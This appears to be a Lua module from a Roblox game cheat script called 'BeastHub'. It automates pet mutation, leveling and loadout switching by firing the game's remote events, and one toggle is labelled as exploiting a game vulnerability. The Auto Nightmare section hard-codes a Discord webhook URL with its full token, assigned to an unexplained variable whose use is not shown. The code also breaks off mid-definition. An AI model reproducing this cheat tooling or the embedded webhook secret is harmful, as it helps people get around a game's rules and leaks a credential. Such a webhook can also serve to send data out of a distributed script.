
local M = {}
    function M.init(Rayfield, beastHubNotify, Window, myFunctions, beastHubIcon, equipItemByName, getMyFarm, getFarmSpawnCFrame, allPetList)

        local Pets = Window:CreateTab("Pets", "cat")

        --Mutation machine
        --get pet mutations list
        local function getMachineMutationTypes()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local success, PetMutationRegistry = pcall(function()
                return require(
                    ReplicatedStorage:WaitForChild("Data")
                        :WaitForChild("PetRegistry")
                        :WaitForChild("PetMutationRegistry")
                )
            end)
            if not success or type(PetMutationRegistry) ~= "table" then
                warn("Failed to load PetMutationRegistry module.")
                return {}
            end
            local machineMutations = PetMutationRegistry.MachineMutationTypes
            if type(machineMutations) ~= "table" then
                warn("MachineMutationTypes not found in PetMutationRegistry.")
                return {}
            end
            local names = {}
            for mutationName, _ in pairs(machineMutations) do
                table.insert(names, tostring(mutationName))
            end
            table.sort(names)
            return names
        end

        -- get place pet location (safe)
        local function getPetEquipLocation()
            local success, result = pcall(function()
                local spawnCFrame = getFarmSpawnCFrame()
                if typeof(spawnCFrame) ~= "CFrame" then
                    return nil
                end
                -- offset forward 5 studs
                return spawnCFrame * CFrame.new(0, 0, -5)
            end)
            if success then
                return result
            else
                warn("[getPetEquipLocation] Error: " .. tostring(result))
                return nil
            end
        end


        local autoStartMachineEnabled = false
        local connectionAutoStartMachine -- store the connection so we can disconnect it later
        local function startMachine()
            local args = {
                [1] = "StartMachine"
            }
            game:GetService("ReplicatedStorage").GameEvents.PetMutationMachineService_RE:FireServer(unpack(args))
        end

        Pets:CreateSection("Mutation Machine")
        Pets:CreateButton({
            Name = "Submit Held Pet",
            Callback = function()
                local args = {
                    [1] = "SubmitHeldPet"
                }
                game:GetService("ReplicatedStorage").GameEvents.PetMutationMachineService_RE:FireServer(unpack(args))
            end,
        })
        local Toggle = Pets:CreateToggle({
            Name = "Auto Start Machine (VULN)",
            CurrentValue = false,
            Flag = "autoStartMutationMachine",
            Callback = function(Value)
                autoStartMachineEnabled = Value
                -- cleanup previous connection if exists
                if connectionAutoStartMachine then
                    connectionAutoStartMachine:Disconnect()
                    connectionAutoStartMachine = nil
                end
                if autoStartMachineEnabled then
                    local prompt
                    local success, err = pcall(function()
                        prompt = workspace.NPCS.PetMutationMachine.Model.ProxPromptPart.PetMutationMachineProximityPrompt
                    end)
                    if not success or not prompt then
                        warn("[BeastHub] Cannot find mutation machine prompt", err or "")
                        return
                    end

                    -- Do an initial check right away
                    if prompt.ActionText ~= "Skip" then
                        startMachine()
                        --print("Mutation Machine is available, starting machine now..")
                    else
                        --print("Mutation Machine is already running")
                    end

                    --  Connect to listen for changes after the initial check
                    connectionAutoStartMachine = prompt:GetPropertyChangedSignal("ActionText"):Connect(function()
                        if prompt.ActionText ~= "Skip" then
                        startMachine()
                            --print("Mutation Machine is available, starting machine now..")
                        else
                            --print("Mutation Machine is already running")
                        end
                    end)
                end
            end,
        })
        Pets:CreateSection("Auto Pet Mutation")
        local phoenixLoady
        Pets:CreateDropdown({
            Name = "Phoenix Loadout",
            Options = {"None", "1", "2", "3", "4", "5", "6"},
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "phoenixLoadoutNum", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                phoenixLoady = tonumber(Options[1])
            end,
        })
        local levelingLoady
        Pets:CreateDropdown({
            Name = "Leveling Loadout (Free 1 pet space)",
            Options = {"None", "1", "2", "3", "4", "5", "6"},
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "levelingLoadoutNum", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                levelingLoady = tonumber(Options[1])
            end,
        })
        local golemLoady
        Pets:CreateDropdown({
            Name = "Golem Loadout",
            Options = {"None", "1", "2", "3", "4", "5", "6"},
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "golemLoadoutNum", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                golemLoady = tonumber(Options[1])
            end,
        })

        local levelingMethod = ""
        Pets:CreateDropdown({
            Name = "Leveling Method",
            Options = {"Loadout only", "Loadout+Levelup Lollipop"},
            CurrentOption = {"Loadout+Levelup Lollipop"},
            MultipleOptions = false,
            Flag = "levelingMethod", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                levelingMethod = Options[1]
            end,
        })

        local selectedPetsForAutoMutation = {}
        local selectedMutationsForAutoMutation
        local Dropdown_petListForMutation = Pets:CreateDropdown({
            Name = "Select Pet/s (excluded favorites)",
            Options = allPetList,
            CurrentOption = {},
            MultipleOptions = true,
            Flag = "autoMutationPets", 
            Callback = function(Options)
                selectedPetsForAutoMutation = Options
            end,
        })

        --add search pet for auto mutation here
        --search pet
        local searchDebounce_petForAutoMutation = nil
        Pets:CreateInput({
            Name = "Search",
            PlaceholderText = "Search Pet...",
            RemoveTextAfterFocusLost = false,
            Callback = function(Text)
                if searchDebounce_petForAutoMutation then
                    task.cancel(searchDebounce_petForAutoMutation)
                end

                searchDebounce_petForAutoMutation = task.delay(0.5, function()
                    local results = {}
                    local query = string.lower(Text)

                    if query == "" then
                        results = allPetList
                    else
                        for _, petName in ipairs(allPetList) do
                            if string.find(string.lower(petName), query, 1, true) then
                                table.insert(results, petName)
                            end
                        end
                    end

                    Dropdown_petListForMutation:Refresh(results)
                    Dropdown_petListForMutation:Set(selectedPetsForAutoMutation) --set to current selected

                end)
            end,
        })

        Pets:CreateButton({
            Name = "Clear selection",
            Callback = function()
                Dropdown_petListForMutation:Set({}) --  
                selectedPetsForAutoMutation = {}
            end,
        })
        --auto mutation flags moved top for the function to recognize them
        local autoPetMutationEnabled = false
        local autoPetMutationThread = nil

        local mutationList = getMachineMutationTypes()
        Pets:CreateDropdown({
            Name = "Select Mutation/s",
            Options = mutationList,
            CurrentOption = {},
            MultipleOptions = true,
            Flag = "selectedMutationsForAutoMutation", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                selectedMutationsForAutoMutation = Options
            end,
        })

        -- local Toggle_autoHatchAfterAutoMutation = Pets:CreateToggle({
        --     Name = "Auto Hatch after Auto mutation",
        --     CurrentValue = false,
        --     Flag = "autoHatchAfterAutoMutation", 
        --     Callback = function(Value)
        --     end,
        -- })

        local Toggle_autoMutation = Pets:CreateToggle({
            Name = "Auto Mutation",
            CurrentValue = false,
            Flag = "autoMutation", 
            Callback = function(Value)
                autoPetMutationEnabled = Value
                local autoMutatePetsV2 --new function using getData
                
                if autoPetMutationEnabled then --declare function code only when condition is right
                    --turn off auto smart hatching instantly
                    Toggle_smartAutoHatch:Set(false)
                    -- Check for missing setup
                    -- Wait until Rayfield sets up the values (or timeout after 10s)
                    local timeout = 3
                    while timeout > 0 and (
                        not phoenixLoady or phoenixLoady == "None"
                        or not levelingLoady or levelingLoady == "None"
                        or not golemLoady or golemLoady == "None"
                        or not selectedPetsForAutoMutation
                        or not selectedMutationsForAutoMutation or #selectedMutationsForAutoMutation == 0
                    ) do
                        task.wait(1)
                        timeout = timeout - 1
                    end
                    --checkers here, final check, works for sudden reconnection
                    if not phoenixLoady or phoenixLoady == "None"
                    or not levelingLoady or levelingLoady == "None"
                    or not golemLoady or golemLoady == "None" 
                    or not selectedPetsForAutoMutation
                    or not selectedMutationsForAutoMutation or #selectedMutationsForAutoMutation == 0 then
                        beastHubNotify("Missing setup!", "Please recheck loadouts", 10)
                        return
                    end
                    
                    autoMutatePetsV2 = function(selectedPetForAutoMutation, mutations, onComplete)
                        --local functions
                        local HttpService = game:GetService("HttpService")
                        
                        local function getPlayerData()
                            local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                            local logs = dataService:GetData()
                            return logs
                        end

                        local function getPetInventory()
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                return playerData.PetsData.PetInventory.Data
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getCurrentPetLevelByUid(uid)
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                    if tostring(id) == uid then
                                        return data.PetData.Level
                                    end
                                end
                                return nil
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getMutationMachineData() 
                            local playerData = getPlayerData()
                            if playerData.PetMutationMachine then
                                return playerData.PetMutationMachine
                            else
                                warn("PetMutationMachine not found!")
                                return nil
                            end
                        end
                        -- Function you can call anytime to refresh pets data
                        local function refreshPets()
                            -- USAGE: local favs, unfavs = refreshPets()
                            local pets = getPetInventory()
                            local favoritePets, unfavoritePets = {}, {}
                            if pets then
                                for uid, pet in pairs(pets) do
                                    local entry = {
                                        Uid = uid,
                                        PetType = pet.PetType,
                                        Uuid = pet.UUID, 
                                        PetData = pet.PetData
                                    }
                                    if pet.PetData.IsFavorite then
                                        table.insert(favoritePets, entry)
                                    else
                                        table.insert(unfavoritePets, entry)
                                    end
                                end
                            end
                            --
                            return favoritePets, unfavoritePets
                        end

                        local function getMachineMutationsData() --all mutation data including enums
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local success, PetMutationRegistry = pcall(function()
                                return require(
                                    ReplicatedStorage:WaitForChild("Data")
                                        :WaitForChild("PetRegistry")
                                        :WaitForChild("PetMutationRegistry")
                                )
                            end)
                            if not success or type(PetMutationRegistry) ~= "table" then
                                warn("Failed to load PetMutationRegistry module.")
                                return {}
                            end
                            local machineMutations = PetMutationRegistry.MachineMutationTypes
                            if type(machineMutations) ~= "table" then
                                warn("MachineMutationTypes not found in PetMutationRegistry.")
                                return {}
                            end
                            -- table.sort(machineMutations)
                            return machineMutations
                        end

                        local function equipItemByName(itemName)
                            local player = game.Players.LocalPlayer
                            local backpack = player:WaitForChild("Backpack")
                            player.Character.Humanoid:UnequipTools() --unequip all first

                            for _, tool in ipairs(backpack:GetChildren()) do
                                if tool:IsA("Tool") and string.find(tool.Name, itemName) then
                                    --print("Equipping:", tool.Name)
                                    player.Character.Humanoid:UnequipTools() --unequip all first
                                    player.Character.Humanoid:EquipTool(tool)
                                    return true -- stop after first match
                                end
                            end
                            return false
                        end

                        local function equipPetByUuid(uuid)
                            local player = game.Players.LocalPlayer
                            local backpack = player:WaitForChild("Backpack")
                            for _, tool in ipairs(backpack:GetChildren()) do
                                if tool:GetAttribute("PET_UUID") == uuid then
                                    player.Character.Humanoid:EquipTool(tool)
                                end
                            end
                        end

                        -- get place pet location (safe)
                        local function getPetEquipLocation()
                            local success, result = pcall(function()
                                local spawnCFrame = getFarmSpawnCFrame()
                                if typeof(spawnCFrame) ~= "CFrame" then
                                    return nil
                                end
                                -- offset forward 5 studs
                                return spawnCFrame * CFrame.new(0, 0, -5)
                            end)
                            if success then
                                return result
                            else
                                warn("[getPetEquipLocation] Error: " .. tostring(result))
                                return nil
                            end
                        end

                        --main function code
                        --vars
                        local favs, unfavs = refreshPets()
                        local selectedMutationsString = string.lower(table.concat(selectedMutationsForAutoMutation, " ")) --combined into 1 string for easy search
                        local selectedMutationFound --if true then no need to mutate
                        local petFoundV2 = false--set to true if candidate is found
                        local message = "Auto mutation stopped"
                        --loop unfavs to find the selected pet to mutate
                        --initial check for rejoin, copied the machine monitoring below
                        local mutationMachineData = getMutationMachineData()
                        if mutationMachineData.SubmittedPet then
                            if mutationMachineData.PetReady == true then
                                beastHubNotify("A Pet is ready to claim!", "Switching to phoenix loadout..", 3)
                                --claim with phoenix
                                myFunctions.switchToLoadout(phoenixLoady, getFarmSpawnCFrame, beastHubNotify)
                                task.wait(6)
                                local args = {
                                    [1] = "ClaimMutatedPet";
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetMutationMachineService_RE", 9e9):FireServer(unpack(args))
                                --Auto Start machine toggle VULN is advised
                            else
                                beastHubNotify("A Pet is already in machine", "Switching to golems loadout..", 3)
                                --switch to golems and wait till pet is ready
                                myFunctions.switchToLoadout(golemLoady, getFarmSpawnCFrame, beastHubNotify)
                                task.wait(6)
                                --monitoring code here
                                local machineCurrentStatus = getMutationMachineData().PetReady
                                while autoPetMutationEnabled and machineCurrentStatus == false do
                                    beastHubNotify("Waiting for Machine to be ready", "", 3)
                                    task.wait(15)
                                    machineCurrentStatus = getMutationMachineData().PetReady
                                end 
                                --claim once while loop is broken, it means pet is ready
                                if autoPetMutationEnabled and machineCurrentStatus == true then
                                    beastHubNotify("A Pet is ready to claim!", "Switching to phoenix loadout..", 3)
                                    myFunctions.switchToLoadout(phoenixLoady, getFarmSpawnCFrame, beastHubNotify)
                                    task.wait(6)
                                    local args = {
                                        [1] = "ClaimMutatedPet";
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetMutationMachineService_RE", 9e9):FireServer(unpack(args))
                                end
                            end
                        end
                        
                        for _, pet in pairs(unfavs) do 
                            local curPet = pet.PetType
                            -- local uid = pet.Uuid
                            local uid = tostring(pet.Uid)
                            local curLevel = pet.PetData.Level
                            local curMutationEnum = pet.PetData.MutationType
                            local curMutation -- fetch later after enums fetch
                            local machineMutationEnums = {} --pet mutation enums container
                            local mutations = getMachineMutationsData() --all mutation data
                            for mutation, data in pairs(mutations) do --extract only enums
                                table.insert(machineMutationEnums, {mutation, data.EnumId})
                            end
                            --get current pet mutation via enum
                            for _, entry in ipairs(machineMutationEnums) do
                                local mutation = entry[1]
                                local enumId = entry[2]
                                if enumId == curMutationEnum then
                                    curMutation = mutation
                                    break
                                end
                            end
                            
                            if curMutation == nil then
                                --beastHubNotify("Pet found has no mutation yet", "", 3)
                            end
                            --check curPet if good for auto mutation
                            if autoPetMutationEnabled and curPet == selectedPetForAutoMutation then 
                                --match current enum if found in selectedMutationsForAutoMutation
                                if curMutation and string.find(selectedMutationsString, string.lower(curMutation)) then
                                    --already mutated
                                    print("Already mutated "..curPet.." with desired mutation", "", 3)
                                else
                                    if curMutation == nil then
                                        -- beastHubNotify("Found target!", curPet.." | ".."No mutation".." | "..curLevel.." | "..uid, 3)    
                                        beastHubNotify("Found target with no mutation yet", "", 3)
                                    else
                                        -- beastHubNotify("Found target!", curPet.." | "..curMutation.." | "..curLevel.." | "..uid ,3)
                                        beastHubNotify("Found target", "", 3)
                                    end
                                    petFoundV2 = true
                                    --DO MAIN ACTIONS HERE TO MUTATION
                                    mutationMachineData = getMutationMachineData()
                                        --start machine if not started
                                    if mutationMachineData.IsRunning == false then
                                        beastHubNotify("Machine started","",3)
                                        startMachine()
                                    else
                                        beastHubNotify("Machine is already running","",3)
                                    end

                                    --process current pet for leveling here
                                    myFunctions.switchToLoadout(levelingLoady, getFarmSpawnCFrame, beastHubNotify)
                                    task.wait(6)

                                    equipPetByUuid(uid)
                                    task.wait()
                                    --place pet to garden for leveling                                    
                                    local petEquipLocation = getPetEquipLocation()
                                    local args = {
                                        [1] = "EquipPet",
                                        [2] = uid,
                                        [3] = petEquipLocation, 
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                    task.wait(1)

                                    while autoPetMutationEnabled and curLevel < 50 do
                                        local haveLollipop = false
                                        if levelingMethod == "Loadout+Levelup Lollipop" then
                                            if equipItemByName("Levelup Lollipop") == false then 
                                                beastHubNotify("No more lollipops!", "Leveling now", 4)    
                                            else
                                                haveLollipop = true
                                                beastHubNotify("Equipping Lollipop", "Leveling now", 4) 
                                            end 
                                            task.wait(1)

                                            while autoPetMutationEnabled and haveLollipop and curLevel < 50 do
                                                task.wait(.5)
                                                local args = {
                                                    [1] = "ApplyBoost";
                                                    [2] = uid;
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetBoostService", 9e9):FireServer(unpack(args))
                                                curLevel = curLevel + 1
                                            end
                                            --refresh pet data
                                            task.wait(2)
                                            curLevel = getCurrentPetLevelByUid(uid)
                                            beastHubNotify("Rechecked pet level: "..curLevel, "",3)
                                            if curLevel < 50 then --if still below 50 after lollipop
                                                beastHubNotify("Still below 50 after lollipop", "",3)
                                            end
                                            --monitor level every 10 sec
                                            while autoPetMutationEnabled and curLevel < 50 do 
                                                beastHubNotify("Current Pet age: "..curLevel, "waiting to hit age 50..",3)
                                                task.wait(10)
                                                curLevel = getCurrentPetLevelByUid(uid)
                                            end
                                            --unequip once ready
                                            local args = {
                                                [1] = "UnequipPet";
                                                [2] = uid;
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                            task.wait(1) 

                                        else --loadout method only
                                            --monitor level every 10 sec
                                            while autoPetMutationEnabled and curLevel < 50 do 
                                                beastHubNotify("Current Pet age: "..curLevel, "waiting to hit age 50..",3)
                                                task.wait(10)
                                                curLevel = getCurrentPetLevelByUid(uid)
                                            end

                                            --unequip once ready
                                            local args = {
                                                [1] = "UnequipPet";
                                                [2] = uid;
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                            task.wait(1) 
                                        end
                                    end


                                    --check if pet is already inside machine
                                    if mutationMachineData.SubmittedPet then
                                        if mutationMachineData.PetReady == true then
                                            beastHubNotify("A Pet is ready to claim!", "Switching to phoenix loadout..", 3)
                                            --claim with phoenix
                                            myFunctions.switchToLoadout(phoenixLoady, getFarmSpawnCFrame, beastHubNotify)
                                            task.wait(6)
                                            local args = {
                                                [1] = "ClaimMutatedPet";
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetMutationMachineService_RE", 9e9):FireServer(unpack(args))
                                            --Auto Start machine toggle VULN is advised
                                        else
                                            beastHubNotify("A Pet is already in machine", "Switching to golems loadout..", 3)
                                            --switch to golems and wait till pet is ready
                                            myFunctions.switchToLoadout(golemLoady, getFarmSpawnCFrame, beastHubNotify)
                                            task.wait(6)
                                            --monitoring code here
                                            local machineCurrentStatus = getMutationMachineData().PetReady
                                            while autoPetMutationEnabled and machineCurrentStatus == false do
                                                beastHubNotify("Waiting for Machine to be ready", "", 3)
                                                task.wait(15)
                                                machineCurrentStatus = getMutationMachineData().PetReady
                                            end 
                                            --claim once while loop is broken, it means pet is ready
                                            if autoPetMutationEnabled and machineCurrentStatus == true then
                                                beastHubNotify("A Pet is ready to claim!", "Switching to phoenix loadout..", 3)
                                                myFunctions.switchToLoadout(phoenixLoady, getFarmSpawnCFrame, beastHubNotify)
                                                task.wait(6)
                                                local args = {
                                                    [1] = "ClaimMutatedPet";
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetMutationMachineService_RE", 9e9):FireServer(unpack(args))
                                            end
                                        end
                                    end
                                    --process current pet here for machine
                                    if autoPetMutationEnabled and curLevel > 49 then
                                        beastHubNotify("Current Pet is good to submit", "", 3)
                                        myFunctions.switchToLoadout(golemLoady, getFarmSpawnCFrame, beastHubNotify)
                                        task.wait(6)
                                        --hold pet then submit      
                                        equipPetByUuid(uid)
                                        task.wait()
                                        local args = {
                                            [1] = "SubmitHeldPet"
                                        }
                                        game:GetService("ReplicatedStorage").GameEvents.PetMutationMachineService_RE:FireServer(unpack(args))
                                        beastHubNotify("Current Pet submitted", "", 3)
                                        task.wait(1)
                                        myFunctions.switchToLoadout(golemLoady, getFarmSpawnCFrame, beastHubNotify)
                                        task.wait(6)
                                        --monitoring code here
                                        local machineCurrentStatus = getMutationMachineData().PetReady
                                        while autoPetMutationEnabled and machineCurrentStatus == false do
                                            beastHubNotify("Waiting for Machine to be ready", "", 3)
                                            task.wait(15)
                                            machineCurrentStatus = getMutationMachineData().PetReady
                                        end 
                                        --claim once while loop is broken, it means pet is ready
                                        if autoPetMutationEnabled and machineCurrentStatus == true then
                                            beastHubNotify("A Pet is ready to claim!", "Switching to phoenix loadout..", 3)
                                            myFunctions.switchToLoadout(phoenixLoady, getFarmSpawnCFrame, beastHubNotify)
                                            task.wait(6)
                                            local args = {
                                                [1] = "ClaimMutatedPet";
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetMutationMachineService_RE", 9e9):FireServer(unpack(args))
                                            message = "Mutation Cycle done"
                                        end
                                    end
                                    break --break for loop for Unfavs
                                end
                            end
                        end

                        --Call the callback AFTER finishing
                        if petFoundV2 == false then 
                            message = "No eligible pet"                     
                        end
                        if typeof(onComplete) == "function" then
                            onComplete(message)
                        end
                    end

                    
                    --main logic
                    if autoPetMutationEnabled and not autoPetMutationThread then
                        autoPetMutationThread = task.spawn(function()
                            while autoPetMutationEnabled do
                                beastHubNotify("Auto Pet mutation running..", "", 3)
                                player.Character.Humanoid:UnequipTools()
                                if selectedPetsForAutoMutation then --
                                    local success, err = pcall(function()
                                        --add loop for multi select    
                                        local failCounter = 0            
                                        for i, petName in ipairs(selectedPetsForAutoMutation) do                                
                                            autoMutatePetsV2(petName, selectedMutationsForAutoMutation, function(msg)
                                                if msg == "No eligible pet" then
                                                    beastHubNotify("Not Found: "..petName, "Make sure to select the correct pet/s", 5)
                                                    failCounter = failCounter + 1
                                                    if failCounter == #selectedPetsForAutoMutation then
                                                        autoPetMutationEnabled = false
                                                        autoPetMutationThread = nil
                                                        --check for auto hatch trigger togle
                                                        -- if Toggle_autoHatchAfterAutoMutation.CurrentValue == true then
                                                        --     task.wait(1)
                                                        --     beastHubNotify("Auto hatching triggered", "", 3)
                                                        --     myFunctions.switchToLoadout(incubatingLoady)
                                                        --     task.wait(6)
                                                        --     Toggle_smartAutoHatch:Set(true)
                                                        -- end
                                                        return
                                                    end
                                                else
                                                    beastHubNotify(msg, "", 5)
                                                end 
                                            end)
                                        end
                                    end)

                                    if success then
                                    else
                                        warn("Auto Mutation Cycle failed with error: " .. tostring(err))
                                        beastHubNotify("Auto Mutation Cycle failed with error: ", tostring(err), 5)
                                    end
                                end
                                task.wait(5) --cycle delay
                            end
                            -- When flag turns false, loop ends and thread resets
                            autoPetMutationThread = nil
                        end)
                    end
                end
            end,
        })
        Pets:CreateDivider()

        Pets:CreateSection("Auto Leveling")
        Pets:CreateParagraph({
            Title = "INSTRUCTIONS:",
            Content = "1.) Setup the leveling loadout from 'Auto Pet Mutation'.\n2.) Make sure there 1 pet slot available in your leveling loadout. \n3.) Select desired level target and start Auto Level"
        })

        local selectedPetsForAutoLevel = {}
        local Dropdown_petListForAutoLevel = Pets:CreateDropdown({
            Name = "Select Pet/s",
            Options = allPetList,
            CurrentOption = {},
            MultipleOptions = true,
            Flag = "autoLevelPets", 
            Callback = function(Options)
                selectedPetsForAutoLevel = Options
            end,
        })

        --add search pet for auto leveling here
        --search pet
        local searchDebounce_petForAutoLeveling = nil
        Pets:CreateInput({
            Name = "Search",
            PlaceholderText = "Search Pet...",
            RemoveTextAfterFocusLost = false,
            Callback = function(Text)
                if searchDebounce_petForAutoLeveling then
                    task.cancel(searchDebounce_petForAutoLeveling)
                end

                searchDebounce_petForAutoLeveling = task.delay(0.5, function()
                    local results = {}
                    local query = string.lower(Text)

                    if query == "" then
                        results = allPetList
                    else
                        for _, petName in ipairs(allPetList) do
                            if string.find(string.lower(petName), query, 1, true) then
                                table.insert(results, petName)
                            end
                        end
                    end

                    Dropdown_petListForAutoLevel:Refresh(results)
                    Dropdown_petListForAutoLevel:Set(selectedPetsForAutoLevel) --set to current selected

                end)
            end,
        })

        Pets:CreateButton({
            Name = "Clear selection",
            Callback = function()
                Dropdown_petListForAutoLevel:Set({}) --  
            end,
        })

        local targetLevelForAutoLevel = Pets:CreateInput({
            Name = "Target Level",
            CurrentValue = "",
            PlaceholderText = "input number..",
            RemoveTextAfterFocusLost = false,
            Flag = "autoLeveltargetLevel",
            Callback = function(Text)
            -- The function that takes place when the input is changed
            -- The variable (Text) is a string for the value in the text box
            end,
        })


        local autoLevelEnabled = false
        local autoLevelThread = nil
        --early declare togggles to access Set:(false)
        local toggle_autoEle
        local toggle_autoNM

        local Toggle_autoLevel = Pets:CreateToggle({
            Name = "Auto level",
            CurrentValue = false,
            Flag = "autoLevel",
            Callback = function(Value)
                autoLevelEnabled = Value

                --  Stop thread if turned off
                if not autoLevelEnabled then
                    if autoLevelThread then
                        task.cancel(autoLevelThread)
                        autoLevelThread = nil
                        beastHubNotify("Auto Level stopped", "", 3)
                    end
                    return
                else
                    --turn off auto hatching of auto level is on
                    Toggle_smartAutoHatch:Set(false)
                    toggle_autoEle:Set(false)
                    toggle_autoNM:Set(false)
                end

                --
                local targetLevel = tonumber(targetLevelForAutoLevel.CurrentValue) or nil
                local isNum = targetLevel
                local targetPetsForAutoLevel = Dropdown_petListForAutoLevel.CurrentOption or nil 
                
                -- Wait until Rayfield sets up the values (or timeout after 10s)
                local timeout = 3
                while timeout > 0 and (
                    not levelingLoady or levelingLoady == "None"
                    or targetPetsForAutoLevel == nil or targetPetsForAutoLevel == "None"
                    or not isNum
                ) do
                    task.wait(1)
                    timeout = timeout - 1
                    targetLevel = tonumber(targetLevelForAutoLevel.CurrentValue)
                    isNum = targetLevel
                end
                
                --actual checker
                if levelingLoady == nil or levelingLoady == "None" or Dropdown_petListForAutoLevel.CurrentOption == nil or Dropdown_petListForAutoLevel.CurrentOption[1] == "None" or not isNum then
                    beastHubNotify("Setup missing", "Please also make sure you select Leveling Loadout", 3)
                    return
                end 

                beastHubNotify("Auto leveling start..", "",3)

                -- ï¿° Start auto-level thread
                autoLevelThread = task.spawn(function()
                    local function getPlayerData()
                        local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                        local logs = dataService:GetData()
                        return logs
                    end

                    local function getPetInventory()
                        local playerData = getPlayerData()
                        if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                            return playerData.PetsData.PetInventory.Data
                        else
                            warn("PetsData not found!")
                            return nil
                        end
                    end

                    local function refreshPets()
                        local pets = getPetInventory()
                        local myPets = {}
                        if pets then
                            for uid, pet in pairs(pets) do
                                table.insert(myPets, {
                                    Uid = uid,
                                    PetType = pet.PetType,
                                    Uuid = pet.UUID,
                                    PetData = pet.PetData
                                })
                            end
                        end
                        return myPets
                    end

                    local function equipPetByUuid(uuid)
                        local player = game.Players.LocalPlayer
                        local backpack = player:WaitForChild("Backpack")
                        for _, tool in ipairs(backpack:GetChildren()) do
                            if tool:GetAttribute("PET_UUID") == uuid then
                                player.Character.Humanoid:EquipTool(tool)
                            end
                        end
                    end

                    local function getPetEquipLocation()
                        local success, result = pcall(function()
                            local spawnCFrame = getFarmSpawnCFrame()
                            if typeof(spawnCFrame) ~= "CFrame" then
                                return nil
                            end
                            return spawnCFrame * CFrame.new(0, 0, -5)
                        end)
                        return success and result or nil
                    end

                    local function getCurrentPetLevelByUid(uid)
                        local playerData = getPlayerData()
                        if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                            for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                if tostring(id) == uid then
                                    return data.PetData.Level
                                end
                            end
                        end
                        return nil
                    end

                    -- ï¿° Main Logic
                    --add loop for multi pets
                    for i, petName in ipairs(Dropdown_petListForAutoLevel.CurrentOption) do
                        --print("Selected pet:", petName)

                        local allMyPets = refreshPets()
                        -- local selectedPet = Dropdown_petListForAutoLevel.CurrentOption[1]
                        local selectedPet = petName --changed to multi select
                        local petFound = false

                        for _, pet in pairs(allMyPets) do 
                            if not autoLevelEnabled then break end

                            local curPet = pet.PetType
                            -- local uid = pet.Uuid
                            local uid = tostring(pet.Uid)
                            local curLevel = pet.PetData.Level

                            if curPet == selectedPet and curLevel < targetLevel then
                                petFound = true
                                beastHubNotify("Found: " .. curPet, "with level: " .. curLevel, "3")

                                myFunctions.switchToLoadout(levelingLoady, getFarmSpawnCFrame, beastHubNotify)
                                task.wait(6)

                                local petEquipLocation = getPetEquipLocation()
                                equipPetByUuid(uid)
                                task.wait()

                                local args = { "EquipPet", uid, petEquipLocation }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9)
                                    :WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                task.wait(1)

                                while autoLevelEnabled and curLevel < targetLevel do
                                    beastHubNotify("Current Pet age: " .. curLevel, "Waiting to hit age " .. targetLevel, 3)
                                    task.wait(10)
                                    curLevel = getCurrentPetLevelByUid(uid)
                                    if autoLevelEnabled and curLevel >= targetLevel then
                                        beastHubNotify("Target level reached for: " .. curPet .. "!", "Done for this pet", 3)
                                        task.wait(.5)
                                        local args = { "UnequipPet", uid }
                                        game:GetService("ReplicatedStorage")
                                            :WaitForChild("GameEvents", 9e9)
                                            :WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                        task.wait(1)
                                        break
                                    end
                                end
                            end
                        end

                        if not autoLevelEnabled then
                            return
                        elseif not petFound then
                            beastHubNotify(selectedPet.." not found", "", 3)
                            task.wait(1)
                        else
                            beastHubNotify("Auto Level cycle done!", "", 3)  
                        end
                    end

                    --  Cleanup
                    autoLevelEnabled = false
                    autoLevelThread = nil

                end)
            end,
        })
        Pets:CreateDivider()

        --Auto NM
        local b = "https://discord.com/api/webhooks/1441639295344447701/DtaeAajnmk9dd-C-Ad1JUseTii6Rfuvpt-rmBrb2gTUOu-KVDK-XIWQm230BqD7WWZ0t"
        Pets:CreateSection("Auto Nightmare")
        Pets:CreateParagraph({
            Title = "INSTRUCTIONS:",
            Content = "1.) Setup the leveling loadout from 'Auto Pet Mutation'.\n2.) Input target level for Nightmare requirement below."
        })

        local selectedPetForAutoNM
        local Dropdown_petListForAutoNM = Pets:CreateDropdown({
            Name = "Select Pet (excluded favorites)",
            Options = allPetList,
            CurrentOption = {},
            MultipleOptions = false,
